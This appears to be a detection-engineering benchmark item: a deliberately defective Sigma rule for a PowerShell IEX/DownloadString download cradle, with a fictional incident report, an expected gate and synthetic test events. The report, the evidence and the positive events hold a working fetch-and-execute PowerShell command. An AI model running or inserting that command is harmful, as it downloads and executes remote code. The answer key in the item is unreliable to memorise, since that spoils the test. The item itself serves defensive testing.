@@ -1,0 +1,113 @@
+id: D3-07
+role: defective
+defect_class: D3
+evasive: false
+why: ScriptBlockText belongs to the PowerShell script-block log source, which is unavailable here, and
+  is not an allowed field for a process_creation rule; the same text is present in the CommandLine field
+  that process_creation does provide.
+expected_gate: G5
+report_text: Responders at the fictional Quillon Insurance Group traced an infection to a malicious Word
+  macro that launched a PowerShell download cradle. The macro started powershell.exe -NoProfile -WindowStyle
+  Hidden IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.88/a.ps1') so that the second
+  stage ran entirely in memory and never touched disk. The report observes that the DownloadString call
+  combined with IEX is the common structure across the campaign's samples, and the identical expression
+  was seen on seven workstations in one afternoon. The script retrieved from the staging address enumerated
+  local accounts and then installed a scheduled task for persistence. Administrators at the firm routinely
+  run PowerShell for inventory collection, but those jobs are launched from the management agent and never
+  download remote scripts into an expression evaluator. Analysts propose a process-creation detection
+  for PowerShell command lines that pair IEX with DownloadString.
+evidence:
+- powershell.exe -NoProfile -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.88/a.ps1')
+- the DownloadString call combined with IEX is the common structure across the campaign's samples
+logsource: windows_process_creation
+techniques:
+- T1059.001
+sigma_yaml: |
+  title: PowerShell Download Cradle With IEX And DownloadString
+  id: f08b3d65-a1c7-4e92-8b04-7d6e2a9c15b8
+  status: experimental
+  description: Detects PowerShell launched with an IEX expression that evaluates the output of a DownloadString call.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.execution
+    - attack.t1059.001
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\powershell.exe'
+      ScriptBlockText|contains|all:
+        - 'DownloadString'
+        - 'IEX'
+    condition: selection
+  falsepositives:
+    - Administrators testing in-memory script retrieval from an approved internal server
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NoProfile -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.88/a.ps1')
+    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+    parent_cmd: WINWORD.EXE /n
+    user: LAB\frank
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.88/a.ps1')
+    parent: C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+    parent_cmd: EXCEL.EXE /e
+    user: LAB\gina
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\ipconfig.exe
+    cmd: ipconfig.exe /all
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\frank
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\notepad.exe
+    cmd: notepad.exe C:\Users\gina\todo.txt
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\gina
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NoProfile -File C:\Scripts\inventory.ps1
+    parent: C:\Program Files\CraneAgent\mgmtagent.exe
+    parent_cmd: mgmtagent.exe --run-job inventory
+    user: NT AUTHORITY\SYSTEM
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NoProfile Invoke-WebRequest -Uri https://intranet.quillon.test/inventory.csv
+      -OutFile C:\Temp\inventory.csv
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\opsadmin
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
